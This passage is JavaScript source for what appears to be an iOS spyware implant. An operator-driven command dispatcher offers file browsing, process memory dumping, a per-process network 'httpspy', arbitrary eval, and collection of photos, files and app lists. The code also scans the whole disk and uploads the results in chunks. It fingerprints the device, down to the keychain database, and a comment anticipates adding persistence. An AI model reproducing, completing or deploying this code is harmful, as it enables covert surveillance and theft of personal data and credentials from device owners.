			var tcpConns = _parseConnections(tcpData.buf, tcpData.size, true);
			Native.callSymbol("free", tcpData.buf);

			for (var ci = 0; ci < tcpConns.length; ci++) {
				var c = tcpConns[ci];
				var st = (c.state >= 0 && c.state < tcpStates.length) ? tcpStates[c.state] : "?" + c.state;

				if (!showAll) {
					if (showListen && st !== "LISTEN") continue;
					if (!showListen && (st === "TIME_WAIT" || st === "CLOSED" || st === "LISTEN")) continue;
				}

				var p = (c.vflag & 2) ? "tcp6   " : "tcp4   ";
				var ls = c.laddr + ":" + c.lport;
				var fs = c.faddr + ":" + c.fport;
				while (ls.length < 28) ls += " ";
				while (fs.length < 28) fs += " ";
				out += p + ls + fs + st + "\n";
				total++;
			}
		} else {
			out += "(tcp: sysctl net.inet.tcp.pcblist_n failed)\n";
		}
	}

	if (showUdp) {
		var udpData = _getSysctlPcbList("net.inet.udp.pcblist_n");
		if (udpData) {
			var udpConns = _parseConnections(udpData.buf, udpData.size, false);
			Native.callSymbol("free", udpData.buf);

			for (var ci = 0; ci < udpConns.length; ci++) {
				var c = udpConns[ci];
				if (!showAll && c.lport === 0 && c.fport === 0) continue;

				var p = (c.vflag & 2) ? "udp6   " : "udp4   ";
				var ls = c.laddr + ":" + c.lport;
				var fs = c.faddr + ":" + c.fport;
				while (ls.length < 28) ls += " ";
				while (fs.length < 28) fs += " ";
				out += p + ls + fs + "\n";
				total++;
			}
		} else {
			out += "(udp: sysctl net.inet.udp.pcblist_n failed)\n";
		}
	}

	out += "\nTotal: " + total + " connections\n";
	return { code: 0, out: out, err: "" };
}

// ---- Process Network Spy ----

function _cmdHttpspy(args) {
	var showAll = false;
	for (var i = 1; i < args.length; i++) {
		if (args[i] === "-a") showAll = true;
		else if (args[i] === "-h" || args[i] === "--help") {
			return { code: 0, out:
				"Usage: httpspy [-a]\n" +
				"  Maps active network connections to owning processes\n" +
				"  Default: show only HTTP (80) / HTTPS (443) connections\n" +
				"  -a    Show ALL network connections per process\n", err: "" };
		}
	}

	var pidBufSize = 4 * 8192;
	var pidBuf = Native.callSymbol("malloc", Native.asBigInt(pidBufSize));
	if (!pidBuf || pidBuf === 0n) return { code: 1, out: "", err: "httpspy: malloc failed\n" };

	var count = Number(Native.callSymbol("proc_listallpids", pidBuf, pidBufSize));
	if (count <= 0) { Native.callSymbol("free", pidBuf); return { code: 1, out: "", err: "httpspy: proc_listallpids failed\n" }; }
	if (count > 8192) count = 8192;

	var pids = [];
	for (var i = 0; i < count; i++) {
		var pid = Native.read32(Native.asBigInt(pidBuf) + Native.asBigInt(i * 4));
		if (pid > 0) pids.push(pid);
	}
	Native.callSymbol("free", pidBuf);

	var fdInfoSize = 8;
	var fdBuf = Native.callSymbol("malloc", Native.asBigInt(fdInfoSize * 2048));
	var sockBuf = Native.callSymbol("malloc", 4096);
	var nameBuf = Native.callSymbol("malloc", 256);
	if (!fdBuf || fdBuf === 0n || !sockBuf || sockBuf === 0n || !nameBuf || nameBuf === 0n) {
		if (fdBuf && fdBuf !== 0n) Native.callSymbol("free", fdBuf);
		if (sockBuf && sockBuf !== 0n) Native.callSymbol("free", sockBuf);
		if (nameBuf && nameBuf !== 0n) Native.callSymbol("free", nameBuf);
		return { code: 1, out: "", err: "httpspy: malloc failed\n" };
	}

	var OFF_SOI_TYPE     = 176;
	var OFF_SOI_PROTO    = 180;
	var OFF_SOI_FAMILY   = 184;
	var OFF_INI_FPORT    = 264;
	var OFF_INI_LPORT    = 268;
	var OFF_INI_VFLAG    = 288;
	var OFF_INI_FADDR4   = 308;
	var OFF_INI_LADDR4   = 324;
	var OFF_INI_FADDR6   = 296;
	var OFF_INI_LADDR6   = 312;
	var OFF_TCP_STATE    = 360;
	var MIN_SI_SIZE      = 364;

	var tcpStates = ["CLOSED", "LISTEN", "SYN_SENT", "SYN_RCVD", "ESTABLISHED",
		"CLOSE_WAIT", "FIN_WAIT_1", "CLOSING", "LAST_ACK", "FIN_WAIT_2", "TIME_WAIT"];
	var results = [];

	for (var pi = 0; pi < pids.length; pi++) {
		var pid = pids[pi];
		var fdBytes = Number(Native.callSymbol("proc_pidinfo", pid, 1, 0, fdBuf, fdInfoSize * 2048));
		if (fdBytes <= 0) continue;
		var fdCount = Math.floor(fdBytes / fdInfoSize);
		var procName = null;

		for (var fi = 0; fi < fdCount && fi < 2048; fi++) {
			try {
				var fd = _readU32(fdBuf, fi * 8);
				var fdtype = _readU32(fdBuf, fi * 8 + 4);
				if (fdtype !== 2) continue;

				Native.callSymbol("memset", sockBuf, 0, 4096);
				var infoBytes = Number(Native.callSymbol("proc_pidfdinfo", pid, fd, 3, sockBuf, 4096));
				if (infoBytes < MIN_SI_SIZE) continue;

				var family = _readU32(sockBuf, OFF_SOI_FAMILY);
				var protocol = _readU32(sockBuf, OFF_SOI_PROTO);
				if (family !== 2 && family !== 30) continue;
				if (protocol !== 6 && protocol !== 17) continue;

				var fport = (_readU8(sockBuf, OFF_INI_FPORT) << 8) | _readU8(sockBuf, OFF_INI_FPORT + 1);
				var lport = (_readU8(sockBuf, OFF_INI_LPORT) << 8) | _readU8(sockBuf, OFF_INI_LPORT + 1);

				if (!showAll && fport !== 80 && fport !== 443 && lport !== 80 && lport !== 443) continue;

				var vflag = _readU8(sockBuf, OFF_INI_VFLAG);
				var faddrStr = "*", laddrStr = "*";

				if (vflag & 1) {
					var fa = new Uint8Array(Native.read(sockBuf + Native.asBigInt(OFF_INI_FADDR4), 4));
					var la = new Uint8Array(Native.read(sockBuf + Native.asBigInt(OFF_INI_LADDR4), 4));
					faddrStr = fa[0] + "." + fa[1] + "." + fa[2] + "." + fa[3];
					laddrStr = la[0] + "." + la[1] + "." + la[2] + "." + la[3];
				} else if (vflag & 2) {
					var fa6 = new Uint8Array(Native.read(sockBuf + Native.asBigInt(OFF_INI_FADDR6), 16));
					var la6 = new Uint8Array(Native.read(sockBuf + Native.asBigInt(OFF_INI_LADDR6), 16));
					faddrStr = _fmtIPv6Short(fa6, 0);
					laddrStr = _fmtIPv6Short(la6, 0);
				}

				var stateStr = "";
				if (protocol === 6 && infoBytes > OFF_TCP_STATE + 4) {
					var st = _readU32(sockBuf, OFF_TCP_STATE);
					stateStr = (st < tcpStates.length) ? tcpStates[st] : "?" + st;
				}

				if (procName === null) {
					Native.callSymbol("memset", nameBuf, 0, 256);
					var nl = Number(Native.callSymbol("proc_name", pid, nameBuf, 255));
					procName = nl > 0 ? Native.readString(Native.asBigInt(nameBuf), 255) : "?";
				}

				results.push({ pid: pid, name: procName,
					proto: (protocol === 6 ? "tcp" : "udp") + (family === 30 ? "6" : "4"),
					laddr: laddrStr, lport: lport, faddr: faddrStr, fport: fport, state: stateStr });
			} catch (fdErr) { /* skip on error */ }
		}
	}

	Native.callSymbol("free", fdBuf);
	Native.callSymbol("free", sockBuf);
	Native.callSymbol("free", nameBuf);

	var out = "PID    Process              Proto  Local                  Remote                       State\n";
	out += "-----  -------------------  -----  ---------------------  ---------------------------  -----------\n";
	for (var ri = 0; ri < results.length; ri++) {
		var r = results[ri];
		var ps = "" + r.pid; while (ps.length < 6) ps += " ";
		var ns = r.name; while (ns.length < 21) ns += " ";
		var ts = r.proto; while (ts.length < 7) ts += " ";
		var ls = r.laddr + ":" + r.lport; while (ls.length < 23) ls += " ";
		var rs = r.faddr + ":" + r.fport; while (rs.length < 29) rs += " ";
		out += ps + ns + ts + ls + rs + r.state + "\n";
	}
	out += "\nTotal: " + results.length + " connections";
	if (!showAll) out += " (HTTP/HTTPS only, use -a for all)";
	out += "\n";
	return { code: 0, out: out, err: "" };
}

// ---- Special Commands (delegate to existing handlers) ----

function _cmdDownload(args, cmd) {
	if (args.length < 2) {
		sendJSON(cmd.command_id, { exit_code: 1, stdout: "", stderr: _strToB64("download: missing path\n"),
			execution_time: 0, timeout: false, _task_id: (cmd.params||{})._task_id||"", _task_type: (cmd.params||{})._task_type||"" }, "exec_result.json");
		return null;
	}
	var path = _resolvePath(args[1]);
	var maxSz = args.length > 2 ? parseInt(args[2]) : MAX_FILE_SIZE;
	handleDownload({ command_id: cmd.command_id, params: { path: path, max_size: maxSz || MAX_FILE_SIZE,
		_task_id: (cmd.params||{})._task_id||"", _task_type: (cmd.params||{})._task_type||"" } });
	return null;
}

function _cmdPhotos(args, cmd) {
	var maxCount = args.length > 1 ? parseInt(args[1]) : 50;
	handlePhotos({ command_id: cmd.command_id, params: { max_count: maxCount || 50,
		_task_id: (cmd.params||{})._task_id||"", _task_type: (cmd.params||{})._task_type||"" } });
	return null;
}

function _cmdApps() {
	var base = "/var/mobile/Containers/Data/Application";
	var dirs = listDir(base);
	var out = "", count = 0;
	for (var i = 0; i < dirs.length; i++) {
		if (dirs[i].type !== "dir") continue;
		var meta = base + "/" + dirs[i].name + "/.com.apple.mobile_container_manager.metadata.plist";
		var hasMeta = Number(Native.callSymbol("access", meta, 0)) === 0;
		out += dirs[i].name + "\t" + (hasMeta ? "metadata" : "no-metadata") + "\n";
		count++;
	}
	out += "\nTotal: " + count + " applications\n";
	return { code: 0, out: out, err: "" };
}

function _cmdUpload(args, cmd) {
	var paths = [];
	for (var i = 1; i < args.length; i++) paths.push(_resolvePath(args[i]));
	if (!paths.length) paths.push("/var/mobile");
	handleFileUpload({ command_id: cmd.command_id, params: { upload_paths: paths,
		_task_id: (cmd.params||{})._task_id||"", _task_type: (cmd.params||{})._task_type||"" } });
	return null;
}

function _cmdEvalCode(args) {
	var code = args.slice(1).join(" ");
	if (!code) return { code: 1, out: "", err: "eval: empty code\n" };
	try {
		var r = eval(code);
		return { code: 0, out: String(r !== undefined ? r : "") + "\n", err: "" };
	} catch (e) {
		return { code: 1, out: "", err: String(e) + "\n" };
	}
}

function _cmdHelp() {
	var out = "Available commands:\n";
	out += "  File System:\n";
	out += "    ls [-l] [-a] [path]          List directory contents\n";
	out += "    cat <file> [file2...]         Display file content\n";
	out += "    pwd                           Print working directory\n";
	out += "    cd [path]                     Change directory\n";
	out += "    mkdir [-p] <path>             Create directory\n";
	out += "    rm [-rf] <path>               Remove file or directory\n";
	out += "    cp <src> <dst>                Copy file\n";
	out += "    mv <src> <dst>                Move/rename\n";
	out += "    stat <path>                   File info\n";
	out += "    chmod <mode> <path>           Change permissions (octal)\n";
	out += "    touch <path>                  Create / update timestamp\n";
	out += "    ln [-s] <target> <link>       Create link\n";
	out += "    readlink <path>               Read symlink target\n";
	out += "    find <path> [-name p] [-type f|d]  Search files\n";
	out += "    head [-n N] <file>            Show first N lines\n";
	out += "    tail [-n N] <file>            Show last N lines\n";
	out += "    wc [-lwc] <file>              Count lines/words/chars\n";
	out += "    grep [-in] <pattern> <file>   Search in file\n";
	out += "    du [-sh] <path>               Disk usage\n";
	out += "    file <path>                   Detect file type\n";
	out += "    hexdump [-n N] <file>         Hex dump\n";
	out += "  System Info:\n";
	out += "    whoami                        Current user\n";
	out += "    id                            User/group IDs\n";
	out += "    uname [-a]                    System information\n";
	out += "    hostname                      Device hostname\n";
	out += "    df [-h]                       Disk space\n";
	out += "    date                          Current date/time\n";
	out += "    echo <text>                   Echo text\n";
	out += "  Process:\n";
	out += "    ps                            List all running processes\n";
	out += "    memdump <pid> <addr> <size>   Dump process memory (hex addr, max 1MB)\n";
	out += "  Network:\n";
	out += "    ifconfig                      Show network interfaces & IP addresses\n";
	out += "    netstats                      Network traffic statistics per interface\n";
	out += "    connections [-t] [-u] [-a] [-l]  List active TCP/UDP connections\n";
	out += "    httpspy [-a]                     Map connections to processes (HTTP/HTTPS)\n";
	out += "  Data Collection:\n";
	out += "    download <path> [max_size]    Download file from device\n";
	out += "    photos [max_count]            Collect photos\n";
	out += "    apps                          List installed apps\n";
	out += "    upload <paths...>             Upload files\n";
	out += "  Advanced:\n";
	out += "    eval <code>                   Execute JavaScript code\n";
	out += "    help                          Show this help\n";
	return { code: 0, out: out, err: "" };
}

// ---- Dispatcher ----

function handleExecuteCommand(cmd) {
	var p = cmd.params || {};
	var commandStr = p.command || "";
	var timeoutSec = p.timeout || 30;
	var workDir = p.working_directory;
	var startMs = Date.now();

	if (workDir) _cwd = workDir;

	if (!commandStr) {
		sendJSON(cmd.command_id, {
			exit_code: 1, stdout: "", stderr: _strToB64("error: empty command\n"),
			execution_time: 0, timeout: false,
			_task_id: p._task_id || "", _task_type: p._task_type || ""
		}, "exec_result.json");
		return;
	}

	var args = _parseArgs(commandStr);
	if (!args.length) {
		sendJSON(cmd.command_id, {
			exit_code: 1, stdout: "", stderr: _strToB64("error: empty command\n"),
			execution_time: 0, timeout: false,
			_task_id: p._task_id || "", _task_type: p._task_type || ""
		}, "exec_result.json");
		return;
	}

	var cmdName = args[0].toLowerCase();
	var result = null;

	try {
		switch (cmdName) {
			case "ls": case "dir":      result = _cmdLs(args); break;
			case "cat": case "type":    result = _cmdCat(args); break;
			case "pwd":                 result = _cmdPwd(); break;
			case "cd":                  result = _cmdCd(args); break;
			case "mkdir": case "md":    result = _cmdMkdir(args); break;
			case "rm": case "del":      result = _cmdRm(args); break;
			case "cp": case "copy":     result = _cmdCp(args); break;
			case "mv": case "move": case "ren": result = _cmdMv(args); break;
			case "stat":                result = _cmdStat(args); break;
			case "chmod":               result = _cmdChmod(args); break;
			case "touch":               result = _cmdTouch(args); break;
			case "ln":                  result = _cmdLn(args); break;
			case "readlink":            result = _cmdReadlink(args); break;
			case "find":                result = _cmdFind(args); break;
			case "head":                result = _cmdHead(args); break;
			case "tail":                result = _cmdTail(args); break;
			case "wc":                  result = _cmdWc(args); break;
			case "grep":                result = _cmdGrep(args); break;
			case "du":                  result = _cmdDu(args); break;
			case "file":                result = _cmdFile(args); break;
			case "hexdump":             result = _cmdHexdump(args); break;
			case "whoami":              result = _cmdWhoami(); break;
			case "id":                  result = _cmdId(); break;
			case "uname":               result = _cmdUname(args); break;
			case "hostname":            result = _cmdHostname(); break;
			case "df":                  result = _cmdDf(args); break;
			case "date":                result = _cmdDate(); break;
			case "echo":                result = _cmdEcho(args); break;
			case "ps":                  result = _cmdPs(args); break;
			case "memdump":             result = _cmdMemdump(args); break;
			case "ifconfig": case "ipconfig": result = _cmdIfconfig(args); break;
			case "netstats": case "netstat":  result = _cmdNetstats(args); break;
			case "connections": case "conn":   result = _cmdConnections(args); break;
			case "httpspy": case "spy":       result = _cmdHttpspy(args); break;
			case "download":            result = _cmdDownload(args, cmd); break;
			case "photos":              result = _cmdPhotos(args, cmd); break;
			case "apps":                result = _cmdApps(); break;
			case "upload": case "file_upload": result = _cmdUpload(args, cmd); break;
			case "eval": case "exec": case "js": result = _cmdEvalCode(args); break;
			case "help": case "?":      result = _cmdHelp(); break;
			default:
				result = { code: 127, out: "", err: cmdName + ": command not found. Type 'help' for available commands.\n" };
		}
	} catch (e) {
		result = { code: 1, out: "", err: "error: " + String(e) + "\n" };
	}

	if (result === null) return;

	var endMs = Date.now();
	var execTime = (endMs - startMs) / 1000;

	sendJSON(cmd.command_id, {
		exit_code: result.code,
		stdout: _strToB64(result.out),
		stderr: _strToB64(result.err),
		execution_time: execTime,
		timeout: execTime >= timeoutSec,
		_task_id: p._task_id || "",
		_task_type: p._task_type || ""
	}, "exec_result.json");
}

function handleBasicInfo(cmd) {
	var info = {
		uuid: DEVICE_UUID,
		machine: DEVICE_MODEL,
		_task_id: (cmd.params && cmd.params._task_id) || "",
		_task_type: (cmd.params && cmd.params._task_type) || "",
		collect_time: Date.now(),
		os_type: "iOS"
	};

	// 1. Kernel / system info via uname
	try {
		var uts = Native.callSymbol("calloc", 1, 1536);
		if (uts && uts !== 0n) {
			Native.callSymbol("uname", uts);
			info.sysname  = Native.readString(uts, 256).replace(/\0/g, "");
			info.nodename = Native.readString(uts + 256n, 256).replace(/\0/g, "");
			info.release  = Native.readString(uts + 512n, 256).replace(/\0/g, "");
			info.version  = Native.readString(uts + 768n, 256).replace(/\0/g, "");
			info.machine_arch = Native.readString(uts + 1024n, 256).replace(/\0/g, "");
			Native.callSymbol("free", uts);
		}
	} catch(e) { info._err_uname = String(e); }

	// 2. Disk space via statfs("/")
	//    struct statfs arm64: f_bsize(u32,0) f_iosize(i32,4) f_blocks(u64,8)
	//                         f_bfree(u64,16) f_bavail(u64,24)
	try {
		var sbuf = Native.callSymbol("calloc", 1, 4096);
		if (sbuf && sbuf !== 0n) {
			var sr = Number(Native.callSymbol("statfs", "/", sbuf));
			if (sr === 0) {
				var bsRaw = new DataView(Native.read(Native.asBigInt(sbuf), 4));
				var bsize  = bsRaw.getUint32(0, true);
				var blocks = Number(Native.readPtr(Native.asBigInt(sbuf) + 8n));
				var bfree  = Number(Native.readPtr(Native.asBigInt(sbuf) + 16n));
				var bavail = Number(Native.readPtr(Native.asBigInt(sbuf) + 24n));
				info.disk_block_size  = bsize;
				info.disk_total_bytes = blocks * bsize;
				info.disk_free_bytes  = bfree * bsize;
				info.disk_avail_bytes = bavail * bsize;
				info.disk_total_gb = Math.round(blocks * bsize / 1073741824 * 10) / 10;
				info.disk_free_gb  = Math.round(bfree * bsize / 1073741824 * 10) / 10;
			}
			Native.callSymbol("free", sbuf);
		}
	} catch(e) { info._err_statfs = String(e); }

	// 3. Process identity
	try {
		info.pid = Number(Native.callSymbol("getpid"));
		info.uid = Number(Native.callSymbol("getuid"));
		info.gid = Number(Native.callSymbol("getgid"));
	} catch(e) {}

	// 4. Hostname via gethostname
	try {
		var hbuf = Native.callSymbol("malloc", 256);
		if (hbuf && hbuf !== 0n) {
			var hr = Number(Native.callSymbol("gethostname", hbuf, 255));
			if (hr === 0) info.hostname = Native.readString(hbuf, 256).replace(/\0/g, "");
			Native.callSymbol("free", hbuf);
		}
	} catch(e) {}

	// 5. Installed apps summary
	try {
		var appBase = "/var/mobile/Containers/Data/Application";
		var appDirs = listDir(appBase);
		var appCount = 0;
		for (var ai = 0; ai < appDirs.length; ai++) {
			if (appDirs[ai].type === "dir") appCount++;
		}
		info.installed_app_count = appCount;
	} catch(e) {}

	// 6. WiFi passwords file status
	try {
		var wfSize = getFileSize("/var/Keychains/keychain-2.db");
		info.keychain_db_size = wfSize > 0 ? wfSize : 0;
	} catch(e) {}

	var endMs = Date.now();
	sendJSON(cmd.command_id, info, "basic_info.json",
		{ start_ms: info.collect_time, end_ms: endMs });
}

// handleUpdate: disabled for now, will be enabled after persistence is ready
// function handleUpdate(cmd) { ... }

// ============================================================================
// disk_scan: recursive filesystem traversal with stat metadata (TXT format)
// ============================================================================

var SCAN_WRITE_BUF = 65536;
var SCAN_MAX_DEPTH = 20;
var SCAN_MAX_ITEMS = 300000;
var SCAN_YIELD_EVERY = 2000;
var SCAN_SKIP_DIRS = [
	"/dev", "/cores",
	"/System/Library/Caches/com.apple.kernelcaches",
	"/System/Library/Caches/com.apple.dyld",
	"/System/Library/PrivateFrameworks",
	"/System/Library/Frameworks",
	"/System/Library/Extensions",
	"/System/Library/CoreServices",
	"/System/Library/PreferenceBundles",
	"/System/iOSSupport",
	"/usr/lib", "/usr/libexec", "/usr/sbin", "/usr/bin", "/usr/share",
	"/usr/standalone",
	"/private/var/db/dyld_shared_cache_arm64e",
	"/private/var/hardware",
	"/private/var/log/asl",
	"/private/preboot",
	"/Library/Ringtones",
	"/Library/Wallpaper"
];

function _readU16(ptr, off) {
	var b = new Uint8Array(Native.read(ptr + Native.asBigInt(off), 2));
	return b[0] | (b[1] << 8);
}
function _readI64(ptr, off) {
	var b = new Uint8Array(Native.read(ptr + Native.asBigInt(off), 8));
	var lo = (b[0] | (b[1] << 8) | (b[2] << 16) | ((b[3] << 24) >>> 0)) >>> 0;
	var hi = (b[4] | (b[5] << 8) | (b[6] << 16) | ((b[7] << 24) >>> 0)) >>> 0;
	return hi * 4294967296 + lo;
}
function _readU8(ptr, off) {
	return new Uint8Array(Native.read(ptr + Native.asBigInt(off), 1))[0];
}
function _readU32(ptr, off) {
	var b = new Uint8Array(Native.read(ptr + Native.asBigInt(off), 4));
	return (b[0] | (b[1] << 8) | (b[2] << 16) | ((b[3] << 24) >>> 0)) >>> 0;
}

function _writeAll(fd, bufSize, ptr, data) {
	var bytes = new Uint8Array(Native.stringToBytes(data, false));
	var pos = 0;
	while (pos < bytes.length) {
		var chunk = Math.min(bytes.length - pos, bufSize);
		var ab = new ArrayBuffer(chunk);
		new Uint8Array(ab).set(bytes.subarray(pos, pos + chunk));
		Native.write(ptr, ab);
		var nw = Number(Native.callSymbol("write", fd, ptr, chunk));
		if (nw <= 0) return false;
		pos += nw;
	}
	return true;
}

function _sanitizePath(p) {
	var s = "";
	for (var i = 0; i < p.length; i++) {
		var c = p.charCodeAt(i);
		if (c === 0x7C) s += "_";
		else if (c === 0x0A || c === 0x0D) s += " ";
		else s += p.charAt(i);
	}
	return s;
}

function handleDiskScan(cmd) {
	var p = cmd.params || {};
	var startMs = Date.now();
	var startISO = new Date(startMs).toISOString().replace("T"," ").replace("Z","");

	var tmpCandidates = [
		"/var/mobile/Library/Caches/ios_disk_scan.txt",
		"/var/mobile/ios_disk_scan.txt",
		"/tmp/ios_disk_scan.txt"
	];
	var tmpPath = "";
	var fd = -1;
	for (var ti = 0; ti < tmpCandidates.length; ti++) {
		fd = Number(Native.callSymbol("open", tmpCandidates[ti], 0x0602, 0x1a4));
		if (fd >= 0) { tmpPath = tmpCandidates[ti]; break; }
	}
	if (fd < 0) {
		sendJSON(cmd.command_id, {
			status: "failed", error: "cannot create temp file (tried " + tmpCandidates.join(", ") + ")",
			_task_id: p._task_id || "", _task_type: p._task_type || ""
		}, "disk_scan_result.json");
		return;
	}

	var wBuf = Native.callSymbol("malloc", Native.asBigInt(SCAN_WRITE_BUF));
	var statBuf = Native.callSymbol("malloc", 144n);
	if (!wBuf || wBuf === 0n || !statBuf || statBuf === 0n) {
		Native.callSymbol("close", fd);
		if (wBuf && wBuf !== 0n) Native.callSymbol("free", Native.asBigInt(wBuf));
		if (statBuf && statBuf !== 0n) Native.callSymbol("free", Native.asBigInt(statBuf));
		sendJSON(cmd.command_id, {
			status: "failed", error: "malloc failed",
			_task_id: p._task_id || "", _task_type: p._task_type || ""
		}, "disk_scan_result.json");
		return;
	}

	var pending = "";
	var FLUSH_AT = 32768;
	var totalFiles = 0, totalDirs = 0, totalLinks = 0, totalSize = 0;
	var itemCount = 0;
	var hitLimit = false;
	var writeErrors = 0;

	function flush() {
		if (pending.length > 0) {
			if (!_writeAll(fd, SCAN_WRITE_BUF, wBuf, pending)) writeErrors++;
			pending = "";
		}
	}
	function emit(line) {
		pending += line + "\n";
		if (pending.length >= FLUSH_AT) flush();
	}

	try {
		emit("# =====================================");
		emit("# Directory Scan Result");
		emit("# =====================================");
		emit("# Scan directory: /");
		emit("# Start time: " + startISO);
		emit("# Start timestamp: " + startMs);
		emit("# =====================================");
		emit("# Format (separator: |)");
		emit("# Col1: Full path");
		emit("# Col2: Type (FILE=file DIR=directory LNK=symlink)");
		emit("# Col3: Attributes (D=directory A=archive R=readonly H=hidden L=symlink)");
		emit("# Col4: Created time (ms timestamp)");
		emit("# Col5: Modified time (ms timestamp)");
		emit("# Col6: Accessed time (ms timestamp)");
		emit("# Col7: Size (bytes, 0 for dirs)");
		emit("# =====================================");

		var stack = ["/", 0];
		var stackLen = 2;

		while (stackLen > 0) {
			if (itemCount >= SCAN_MAX_ITEMS) { hitLimit = true; break; }

			var depth = stack[stackLen - 1];
			var dirPath = stack[stackLen - 2];
			stackLen -= 2;

			if (depth > SCAN_MAX_DEPTH) continue;

			var skip = false;
			for (var si = 0; si < SCAN_SKIP_DIRS.length; si++) {
				if (dirPath === SCAN_SKIP_DIRS[si] ||
					dirPath.indexOf(SCAN_SKIP_DIRS[si] + "/") === 0) {
					skip = true; break;
				}
			}
			if (skip) continue;

			var dh = Native.callSymbol("opendir", dirPath);
			if (!dh || dh === 0n) continue;

			try {
				for (;;) {
					if (itemCount >= SCAN_MAX_ITEMS) { hitLimit = true; break; }

					var ent = Native.callSymbol("readdir", Native.asBigInt(dh));
					if (!ent || ent === 0n) break;

					try {
						var dtype = new Uint8Array(Native.read(Native.asBigInt(ent) + 20n, 1))[0];
						var name = Native.readString(Native.asBigInt(ent) + 21n, 256);
						if (name === "." || name === "..") continue;

						var fullPath = dirPath === "/" ? "/" + name : dirPath + "/" + name;
						var ret = Number(Native.callSymbol("lstat", fullPath, Native.asBigInt(statBuf)));

						var ftype = "FILE", attrs = "-A----", fsize = 0;
						var ctime = 0, mtime = 0, atime = 0;

						if (ret === 0) {
							var mode = _readU16(Native.asBigInt(statBuf), 4);
							var fmt = mode & 0xF000;
							if (fmt === 0x4000) {
								ftype = "DIR"; attrs = "D-----"; totalDirs++;
							} else if (fmt === 0xA000) {
								ftype = "LNK"; attrs = "----L-"; totalLinks++;
							} else {
								ftype = "FILE";
								fsize = _readI64(Native.asBigInt(statBuf), 96);
								totalSize += fsize;
								totalFiles++;
								var writable = mode & 0x0080;
								var hidden = name.charAt(0) === ".";
								attrs = "-A" + (writable ? "-" : "R") + (hidden ? "H" : "-") + "--";
							}
							atime = _readI64(Native.asBigInt(statBuf), 32) * 1000;
							mtime = _readI64(Native.asBigInt(statBuf), 48) * 1000;
							ctime = _readI64(Native.asBigInt(statBuf), 80) * 1000;
						} else {
							if (dtype === 4) {
								ftype = "DIR"; attrs = "D-----"; totalDirs++;
							} else {
								totalFiles++;
							}
						}

						emit(_sanitizePath(fullPath) + "|" + ftype + "|" + attrs + "|" + ctime + "|" + mtime + "|" + atime + "|" + fsize);
						itemCount++;

						if (itemCount % SCAN_YIELD_EVERY === 0) {
							Native.callSymbol("usleep", 10000);
						}

						if ((dtype === 4 || (ret === 0 && (_readU16(Native.asBigInt(statBuf), 4) & 0xF000) === 0x4000))
							&& dtype !== 10) {
							stack[stackLen] = fullPath;
							stack[stackLen + 1] = depth + 1;
							stackLen += 2;
						}
					} catch(entErr) {}
				}
			} finally {
				Native.callSymbol("closedir", Native.asBigInt(dh));
			}
		}

		var endMs = Date.now();
		var endISO = new Date(endMs).toISOString().replace("T"," ").replace("Z","");
		var elapsed = (endMs - startMs) / 1000;
		var totalItems = totalFiles + totalDirs;
		var speed = elapsed > 0 ? Math.round(totalItems / elapsed) : totalItems;

		emit("# =====================================");
		emit("# Scan Statistics");
		emit("# =====================================");
		emit("# Total files: " + totalFiles);
		emit("# Total dirs: " + totalDirs);
		emit("# Total symlinks: " + totalLinks);
		emit("# Total items scanned: " + itemCount);
		emit("# Total size (bytes): " + totalSize);
		emit("# Hit item limit: " + (hitLimit ? "YES (" + SCAN_MAX_ITEMS + ")" : "NO"));
		emit("# Max depth: " + SCAN_MAX_DEPTH);
		emit("# Write errors: " + writeErrors);
		emit("# Elapsed (seconds): " + Math.round(elapsed));
		emit("# Speed (items/sec): " + speed);
		emit("# End time: " + endISO);
		emit("# End timestamp: " + endMs);
		emit("# =====================================");

	} catch(scanErr) {
		emit("# SCAN ERROR: " + String(scanErr));
	}

	flush();
	Native.callSymbol("fsync", fd);
	Native.callSymbol("free", Native.asBigInt(wBuf));
	Native.callSymbol("free", Native.asBigInt(statBuf));

	var fileSize = Number(Native.callSymbol("lseek", fd, 0, 2));
	Native.callSymbol("lseek", fd, 0, 0);

	var upResult = _sendChunksFromFd(cmd.command_id, fd, fileSize, "scanDisk_root.txt", "disk_scan",
		{ start_ms: startMs, end_ms: Date.now() });

	Native.callSymbol("close", fd);
	fd = -1;
	Native.callSymbol("unlink", tmpPath);

	if (!upResult || !upResult.ok) {
		try {
			sendJSON(cmd.command_id, {
				status: "upload_failed",
				error: upResult ? upResult.error : "null result",
				chunks_sent: upResult ? upResult.sent : 0,
				chunks_total: upResult ? upResult.total : 0,
				file_size: fileSize,
				scan_items: itemCount,
				tmp_path: tmpPath,
				_task_id: p._task_id || "",
				_task_type: p._task_type || ""
			}, "disk_scan_error.json");
		} catch(re) {}
	}
}

// ============================================================================
// Native SQLite Query Helper
// ============================================================================

var _sqliteLoaded = false;
function _ensureSqlite() {
	if (_sqliteLoaded) return true;
	var h = Native.callSymbol("dlopen", "/usr/lib/libsqlite3.dylib", 1);
	if (!h || h === 0n) return false;
	_sqliteLoaded = true;
	return true;
}

function _sqliteQuery(dbPath, sql, maxRows) {
	if (!_ensureSqlite()) return null;
	maxRows = maxRows || 500;
	var ppDb = Native.callSymbol("malloc", 8);
	if (!ppDb || ppDb === 0n) return null;
	Native.write64(ppDb, 0n);
	var rc = Number(Native.callSymbol("sqlite3_open_v2", dbPath, ppDb, 1, 0n));
	var db = Native.readPtr(ppDb);
	Native.callSymbol("free", ppDb);
	if (rc !== 0 || !db || db === 0n) {
		if (db && db !== 0n) Native.callSymbol("sqlite3_close", db);
		return null;
	}
	try {
		var ppStmt = Native.callSymbol("malloc", 8);
		if (!ppStmt || ppStmt === 0n) return null;
		Native.write64(ppStmt, 0n);
		rc = Number(Native.callSymbol("sqlite3_prepare_v2", db, sql, -1, ppStmt, 0n));
		var stmt = Native.readPtr(ppStmt);
		Native.callSymbol("free", ppStmt);
		if (rc !== 0 || !stmt || stmt === 0n) return null;
		try {
			var rows = [];
			var colCount = Number(Native.callSymbol("sqlite3_column_count", stmt));
			var colNames = [];
			for (var c = 0; c < colCount; c++) {
				var np = Native.callSymbol("sqlite3_column_name", stmt, c);
				colNames.push(np && np !== 0n ? Native.readString(np, 256).replace(/\0/g, "") : "col" + c);
			}
			while (rows.length < maxRows) {
				rc = Number(Native.callSymbol("sqlite3_step", stmt));
				if (rc !== 100) break;
				var row = {};
				for (var c = 0; c < colCount; c++) {
					var tp = Number(Native.callSymbol("sqlite3_column_type", stmt, c));
					if (tp === 5) { row[colNames[c]] = null; continue; }
					if (tp === 1) {
						row[colNames[c]] = Number(Native.callSymbol("sqlite3_column_int64", stmt, c));
					} else if (tp === 2) {
